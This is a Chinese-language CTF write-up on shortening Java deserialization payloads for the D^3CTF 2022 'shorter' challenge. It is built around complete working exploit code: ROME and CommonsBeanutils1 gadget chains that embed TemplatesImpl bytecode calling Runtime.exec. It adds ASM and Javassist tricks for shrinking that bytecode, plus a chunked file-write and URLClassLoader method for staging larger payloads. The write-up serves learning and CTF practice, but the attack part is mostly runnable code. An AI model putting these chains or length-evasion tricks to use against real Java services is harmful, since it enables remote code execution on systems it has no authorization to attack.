payload缩短技术-\[D^3CTF2022\] Shorter
==================================

前言
--

这篇文章会结合 D^3CTF 的一道题目来学习 Payload 缩短的方法

题目为 D^3CTF 的 shorter，相信大家也都不陌生，题目给出了源码、dockerfile 等，大家可以自行搭建复现。

将源码反编译后可以看到，主要控制器中存在注入点，很明显是要考反序列化了,

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-cbdffc3569e27a054c87c8feb63459e4b36433af.png)

不过我们需要绕过这里的长度限制

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-b3d9c226ad9bf6d1ef3cd8779c29589bbfb8e4ac.png)

在这一堆包里我们很容易看到我们的利用点拉，rome1.0 所有看过 ysoserial 的人都知道这个好使。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-07b23104027972b87061c2f6e07c59fc1c10db2e.png)

但是生成了之后转码一下 Base64，发现大小远远超出了给定的长度，又看了了一下自己写的链子，短了一点点，真的就一点点。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-8722d054c075d2075221584742ebd81e173a4394.png)

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.*;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class ROMEtest {
    public ROMEtest() throws NotFoundException {
    }

    public static class StubTransletPayload extends AbstractTranslet {
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((new ClassClassPath(StubTransletPayload.class)));
        CtClass clazz = pool.get((StubTransletPayload.class.getName()));
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("sp4c1ous");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] { clazz.toBytecode() });
        setFieldValue(templates, "_name", "HelloTemplatesTmpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
        //构造BadAttributeValueExpException
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("sp4c1ous");
        //反射将恶意的ObjectBean设置进BadAttributeValueExpException中
        setFieldValue(badAttributeValueExpException, "val", objectBean);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(badAttributeValueExpException);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())));

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();
    }
}

```

用的还是那一条调用起来比较快速的，利用 BadAttributeValueExpException 的链子，结果出来也是这么长。

反而当时参考 ysoserial 来构造的通过 HashMap 进入的要短一些

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.*;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class ROMEtest2 {
    public ROMEtest2() throws NotFoundException {
    }

    public static class StubTransletPayload extends AbstractTranslet {
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((new ClassClassPath(StubTransletPayload.class)));
        CtClass clazz = pool.get((StubTransletPayload.class.getName()));
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("sp4c1ous");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] { clazz.toBytecode() });
        setFieldValue(templates, "_name", "HelloTemplatesTmpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        ObjectBean objectBean = new ObjectBean(Templates.class,templates);
        ObjectBean objectBean1 = new ObjectBean(ObjectBean.class,objectBean);

        HashMap hashMap = new HashMap();
        setFieldValue(hashMap, "size", 2);

        Class nodeC = Class.forName("java.util.HashMap$Node");
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 1);
        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean1, objectBean1, null));
        setFieldValue(hashMap, "table", tbl);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())));

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();
    }
}

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-d85e49d13a78e9501cc5d919a8b48b90bd56ca21.png)

但是还是有三千多，不过既然这个短我们就还是通过这个来入手吧

我们可以怎样来进行缩减呢？在参考各方资料之前先来想一下比较好。

```plaintext
¬í..sr..java.util.HashMap..ÚÁÃ.`Ñ...F.
loadFactorI.    thresholdxp?@......w.........sr.(com.sun.syndication.feed.impl.ObjectBean...Þv..J...L.._cloneableBeant.-Lcom/sun/syndication/feed/impl/CloneableBean;L.._equalsBeant.*Lcom/sun/syndication/feed/impl/EqualsBean;L.
_toStringBeant.,Lcom/sun/syndication/feed/impl/ToStringBean;xpsr.+com.sun.syndication.feed.impl.CloneableBeanÝa»Å3Okw...L.._ignorePropertiest..Ljava/util/Set;L.._objt..Ljava/lang/Object;xpsr..java.util.Collections$EmptySet.õr.´.Ë(...xpsq.~..sq.~..q.~..sr.:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl  WOÁn¬«3...I.
_indentNumberI.._transletIndex[.
_bytecodest..[[B[.._classt..[Ljava/lang/Class;L.._namet..Ljava/lang/String;L.._outputPropertiest..Ljava/util/Properties;xp....ÿÿÿÿur..[[BKý..ggÛ7...xp....ur..[B¬ó.ø..Tà...xp...ÖÊþº¾...4.2
......0......<init>...()V...Code...LineNumberTable...LocalVariableTable...this...StubTransletPayload...InnerClasses...LROMEtest2$StubTransletPayload;.. transform..r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V...document..-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;...handlers..B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;..
Exceptions.. ..¦(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V...iterator..5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;...handler..ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;..
SourceFile...ROMEtest2.java.......!...ROMEtest2$StubTransletPayload..@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet..9com/sun/org/apache/xalan/internal/xsltc/TransletException..    ROMEtest2...<clinit>...java/lang/Runtime..#..
getRuntime...()Ljava/lang/Runtime;..%.&
.$.'...calc.exe..)...exec..'(Ljava/lang/String;)Ljava/lang/Process;..+.,
.$.-..
StackMapTable...sp4c1ous..
Lsp4c1ous;.!......................./........*·..±.............................  .1.....
.........?........±..................... .......    .1...................................
.........I........±.....................*.......    .1.............................................".........$........§...L¸.(.*¶..W±...../......................
.......
.   pt..HelloTemplatesTmplpw..xsr.(com.sun.syndication.feed.impl.EqualsBeanõ..»åö.....L.
_beanClasst..Ljava/lang/Class;L.._objq.~.   xpvr..javax.xml.transform.Templates...........xpq.~..sr.*com.sun.syndication.feed.impl.ToStringBean õ.J.#î1...L.
_beanClassq.~..L.._objq.~.  xpq.~..q.~..sq.~..vq.~..q.~.
sq.~..q.~."q.~.
q.~..x
```

这是解 Base64 之后的内容，从利用链上来说我们应该是存在一定的操作空间的

```java
/**
 *
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 *
 */
```

然后，或许我们可以尝试一下将 java 包的路径缩短？

由于欠缺了太多知识，这里决定直接去看文章学习吧，先看 4ra1n 师傅的

前置
--

### 缩短技术学习

4ra1n 师傅以 CommonsBeanutils1 为例作出了总结，缩短 Paylaod 的重点在于三个部分：

- 序列化数据本身的缩小
- 针对`TemplatesImpl`中`_bytecodes`字节码的缩小
- 对于执行的代码如何缩小（`STATIC`代码块）

这里需要队 CommonsBeanutils1 这条链子有一些了解，所以我先去调试了一遍，理解了一下 ysoserial 的构造，在有了之前的经验之后这里实际上还是得心应手的，一个小时就回来了。

那么这里我们来看 CommonsBeanutils1 是怎样被缩小的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-9a1155da54ab5061af4dea4c591bacff53292d82.png)

可以看到，这里的长度为 3684，不同的 Java 版本之间可能会存在差异，但是总之就差不多这么个数

```java
System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())).length());
```

我们可以用这个代码来直接进行 base64 后长度的确认

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-35e8f7d878b98cf8d5fa6896e3ce0d2298ff99be.png)

可以看到我们自己手捏出来的 exp 长度为 2808

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Base64;
import java.util.PriorityQueue;

public class CB1test {
    public CB1test() throws NotFoundException {
    }

    public static class StubTransletPayload extends AbstractTranslet {
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((new ClassClassPath(ROMEtest2.StubTransletPayload.class)));
        CtClass clazz = pool.get((ROMEtest2.StubTransletPayload.class.getName()));
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("sp4c1ous");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{clazz.toBytecode()});
        setFieldValue(templates, "_name", "HelloTemplatesTmpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator("lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        setFieldValue(comparator, "property", "outputProperties");

        Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())).length());

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();
    }
}

```

小了不少，大概四分之一。

#### 优化代码

我们还可以对我们上面的 exp 进行进一步的优化 `_name` 不为空即可，我们可以让它尽可能短，`_tfactory`属性可以删除（分析`TemplatesImpl`得出）

```java
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{clazz.toBytecode()});
        setFieldValue(templates, "_name", "1");
```

同时 code 的构造我们也可以进一步进行精简，先不看我们的 exp

```java
public class EvilByteCodes extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {

    }
}
```

这是 4ra1n 师傅原本构造的恶意类，`e.printStackTrace();` 捕获异常后进行了处理，实际上并不需要。

不过我这里是用的 javassist 来进行操作，本身应该也没有写什么异常处理，究竟里面写了什么要靠 javassist 定夺了，不过这里我们可以把 setName 去掉~

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-2c4d3cfac2c06bcacac3ef2a8577094c4cde7d3c.png)

结果一运行，只少了五十

尝试把生成 evilcode 的部位精简一下，精简成上面 4ra1n 师傅的样子

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Base64;
import java.util.PriorityQueue;

public class CB1test {
    public CB1test() throws NotFoundException {
    }

    public static class StubTransletPayload extends AbstractTranslet {
        static {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (Exception e) {
                e.printStackTrace();  //发现这里实际上设置与不设置得结果是一样的
            }
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {

        }
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((new ClassClassPath(ROMEtest2.StubTransletPayload.class)));
        CtClass clazz = pool.get((ROMEtest2.StubTransletPayload.class.getName()));

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{clazz.toBytecode()});
        setFieldValue(templates, "_name", "1");

        BeanComparator comparator = new BeanComparator("lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        setFieldValue(comparator, "property", "outputProperties");

        Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())).length());

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();
    }
}

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-51451e4f694bb90eb5cf59bba3a7d1d027ec5708.png)

效果显著，直接少了三百字符，但是看完后面的一部分文章之后又有点懵了，在 4ra1n 后面的介绍中有说到，我们在使用了 javassist 之后，是默认没有 LineNumberTable 的，所以会小很多，大那是这里把使用了 javassist 的部分删除反而会减小呢？

暂时存疑，猜测和写入这个行为有关。

#### 结合 ASM 进行字节码层面优化

`EvilBytesCode` 恶意类的字节码是可以缩减的

```java
┌──(sp4c1ous㉿PC-20210224XFDL)-[/mnt/c/Program Files/Java/mvn/untitled4/out/production/untitled4]
└─$ javap -c -l evilCode.class
Compiled from "evilCode.java"
public class evilCode {
  public evilCode();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return
    LineNumberTable:
      line 6: 0
    LocalVariableTable:
      Start  Length  Slot  Name   Signature
          0       5     0  this   LevilCode;

  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM, com.sun.org.apache.xml.internal.serializer.SerializationHandler[]);
    Code:
       0: return
    LineNumberTable:
      line 15: 0
    LocalVariableTable:
      Start  Length  Slot  Name   Signature
          0       1     0  this   LevilCode;
          0       1     1 document   Lcom/sun/org/apache/xalan/internal/xsltc/DOM;
          0       1     2 handlers   [Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;

  public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler);
    Code:
       0: return
    LineNumberTable:
      line 18: 0
    LocalVariableTable:
      Start  Length  Slot  Name   Signature
          0       1     0  this   LevilCode;
          0       1     1 document   Lcom/sun/org/apache/xalan/internal/xsltc/DOM;
          0       1     2 iterator   Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;
          0       1     3 handler   Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;

  static {};
    Code:
       0: invokestatic  #2                  // Method java/lang/Runtime.getRuntime:()Ljava/lang/Runtime;
       3: ldc           #3                  // String calc.exe
       5: invokevirtual #4                  // Method java/lang/Runtime.exec:(Ljava/lang/String;)Ljava/lang/Process;
       8: pop
       9: goto          13
      12: astore_0
      13: return
    Exception table:
       from    to  target type
           0     9    12   Class java/lang/Exception
    LineNumberTable:
      line 9: 0
      line 11: 9
      line 10: 12
      line 12: 13
    LocalVariableTable:
      Start  Length  Slot  Name   Signature
}
```

对字节码进行分析，可以看出，该类每个方法包含了三部分：

- 代码对应的字节码
- LineNumberTable
- ExceptionTable和LocalVariableTable

**这里可以发现自己缺少一些 Java 指令与字节码更为深入的知识**

由一些 JVM 的相关知识可以得知，局部变量和异常表是不能删除的，否则会无法执行，但是 LineNumberTable 是可以删除的 。

> LineNumberTable，用于描述java源代码的行号和字节码行号的对应关系，它不是运行时必需的属性，如果通过-g:none的编译器参数来取消生成这项信息的话，最大的影响就是异常发生的时候，堆栈中不能显示出出错的行号，调试的时候也不能按照源代码来设置断点

映射到代码中就是 `LINENUMBER` 指令可以全部删了，于是基于ASM实现删除`LINENUMBER`

```java
byte[] bytes = Files.readAllBytes(Paths.get(path));
ClassReader cr = new ClassReader(bytes);
ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
int api = Opcodes.ASM9;
ClassVisitor cv = new ShortClassVisitor(api, cw);
int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
cr.accept(cv, parsingOptions);
byte[] out = cw.toByteArray();
Files.write(Paths.get(path), out);
```

ASM 是一种通用 Java 字节码操作和分析框架。它可以用于修改现有的 class 文件或动态生成 class 文件。[推荐文章](https://zhuanlan.zhihu.com/p/94498015) [下载地址](https://mvnrepository.com/artifact/org.ow2.asm/asm/9.2)

ShortClassVisitor

```java
public class ShortClassVisitor extends ClassVisitor {
    private final int api;

    public ShortClassVisitor(int api, ClassVisitor classVisitor) {
        super(api, classVisitor);
        this.api = api;
    }

    @Override
    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
        return new ShortMethodAdapter(this.api, mv);
    }
}
```

重点在于ShortMethodAdapter：如果遇到`LINENUMBER`指令则 **阻止传递** ，可以理解为返回空

```java
public class ShortMethodAdapter extends MethodVisitor implements Opcodes {

    public ShortMethodAdapter(int api, MethodVisitor methodVisitor) {
        super(api, methodVisitor);
    }

    @Override
    public void visitLineNumber(int line, Label start) {
        // delete line number
    }
}
```

读取编译的字节码并处理后替换

```java
Resolver.resolve("/path/to/EvilByteCodes.class");
byte[] newByteCodes = Files.readAllBytes(Paths.get("/path/to/EvilByteCodes.class"));
byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
System.out.println(new String(payload).length());
```

有一些看不懂，不太知道应该怎么实现了，但实际上在 4ra1n 师傅自己的 [项目](https://github.com/4ra1n/ShortPayload/tree/0d127c52a980dc35a822089bd44b72ec090d814d/src/main/java/org/sec/payload) 里也没有使用 ASM 技术，因为恶意类在我们的代码中是写死的，并不能实现动态构造，不过师傅还是给出了 [示例](https://github.com/4ra1n/ShortPayload/tree/0d127c52a980dc35a822089bd44b72ec090d814d/src/main/java/org/sec/payload) 。

#### Javassist 进一步使用

ASM 固然是动态构造字节码的一种手段，但是总有更好的方式，这里就是 Javassist

```java
private static byte[] getTemplatesImpl(String cmd) {
    try {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("Evil");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);

        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("        try {\n" +
                            "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                            "        } catch (Exception ignored) {\n" +
                            "        }");

        CtMethod ctMethod1 = CtMethod.make("    public void transform(" +
                                           "com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                                           "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) {\n" +
                                           "    }", ctClass);
        ctClass.addMethod(ctMethod1);

        CtMethod ctMethod2 = CtMethod.make("    public void transform(" +
                                           "com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                                           "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, " +
                                           "com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {\n" +
                                           "    }", ctClass);
        ctClass.addMethod(ctMethod2);

        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();

        return bytes;
    } catch (Exception e) {
        e.printStackTrace();
        return new byte[]{};
    }
}
```

这里利用了一系列的 make 和 set 但是没有用到 makeClassInitializer().insertAfter(cmd) 看来就是这里的问题了。

这里刚刚已经提过一嘴了，使用Javassist生成的字节码似乎本身就不包含 `LINENUMBER` 指令，不过这里是 4ra1n 师傅的猜测 ... 因为用 ASM 删除之后 Payload 进一步缩小了。

#### 删除重写方法

```java
    public static class StubTransletPayload extends AbstractTranslet {
        static {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (Exception e) {
                e.printStackTrace();  //发现这里实际上设置与不设置得结果是一样的
            }
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {

        }
    }
```

我们用来生成恶意字节码的类必须继承自 `AbstractTranslet` 抽象类，所以必须重写两个 `transform` 方法

如果不进行重写代码会导致编译不通过，无法执行，但是编译不通过不代表非法，我们可以通过手段直接构造对应的字节码！

1. 通过 ASM 删除方法
    
    ```java
    @Override
    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
        if (name.equals("transform")) {
            return null;
        }
        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
        return new ShortMethodAdapter(this.api, mv, name);
    }
    ```
2. 通过Javassist直接构造
    
    ```java
    private static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("        try {\n" +
                                "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                                "        } catch (Exception ignored) {\n" +
                                "        }");
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
    ```

所以 javassist 中有一部分的缩短也是因为这里，在我一开始的例子中并没有处理 transform 重写这一部分

不过这里的删除并不是所有方法都能删除，比如不存在构造方法的情况下就无法删除空参构造。

在这种时候，我们可以删除静态代码块，将代码写入空参构造

```java
ClassPool pool = ClassPool.getDefault();
CtClass ctClass = pool.makeClass("Evil");
CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
ctClass.setSuperclass(superClass);
CtConstructor constructor = CtNewConstructor.make("    public Evil(){\n" +
                                                  "        try {\n" +
                                                  "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                                                  "        }catch (Exception ignored){}\n" +
                                                  "    }", ctClass);
ctClass.addConstructor(constructor);
byte[] bytes = ctClass.toBytecode();
ctClass.defrost();
return bytes;
```

#### 分块传输

以上的内容都在围绕字节码和序列化数据的缩小，对于 `STATIC` 代码块中需要执行的代码也有缩小手段，这也是更有实战意义的思考。

于是有了一个新的思路：可以用追加的方式发送多个请求往指定文件中写入字节码，将真正需要执行的字节码分块

使用Javassist动态生成写入每一分块的Payload，以追加的方式将所有字节码的Base64写入某文件

```java
static {
    try {
        String path = "/your/path";
        // 创建文件
        File file = new File(path);
        file.createNewFile();
        // 传入true是追加方式写文件
        FileOutputStream fos = new FileOutputStream(path, true);
        // 需要写入的数据
        String data = "BASE64_BYTECODES_PART";
        fos.write(data.getBytes());
        fos.close();
    } catch (Exception ignore) {
    }
}
```

在最后一个包中将字节码进行Base64Decode并写入`class`文件

```java
static {
    try {
        String path = "/your/path";
        FileInputStream fis = new FileInputStream(path);
        // size取决于实际情况
        byte[] data = new byte[size];
        fis.read(data);
        // 写入Evil.class
        FileOutputStream fos = new FileOutputStream("Evil.class");
        fos.write(Base64.getDecoder().decode(data));
        fos.close();
    } catch (Exception ignored) {
    }
}
```

用 `Stream` 读写产生的 `Payload` 会更小

最后一个包使用 `URLClassLoader` 进行加载，注意一个小坑，传入 `URLClassLoader` 的路径要以 `file://` 开头且以 `/` 结尾否则会找不到对应的类

```java
static {
    try {
        String path = "file:///your/path/";
        URL url = new URL(path);
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
        Class<?> clazz = urlClassLoader.loadClass("Evil");
        clazz.newInstance();
    } catch (Exception ignored) {
    }
}
```

以上内容大部分来自[ 4ra1n 师傅的先知社区](https://xz.aliyun.com/t/10824#toc-4)

\[D^3CTF 2022\] shorter
-----------------------

这里主要就是对我们上面内容的利用了。

对代码进行更改后，base64长度缩短到了2076

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-def10b1fb382eb6b40cd16cbe674d55f6533cc0c.png)

接下来的部分就不太会了，这里并不能单纯依靠上面的内容来进行构造，这里涉及到了一条新的链子。

这条链子要利用的是 `com.sun.syndication.feed.impl.EqualsBean#equals` 方法，在 JDK7u21 中会出现，只是我还没学到那里~

实际上这一条链子在网上的流传也是比较广的，在ROME学习得时候，也算是在学习 ROME 的时候的一点失误了。

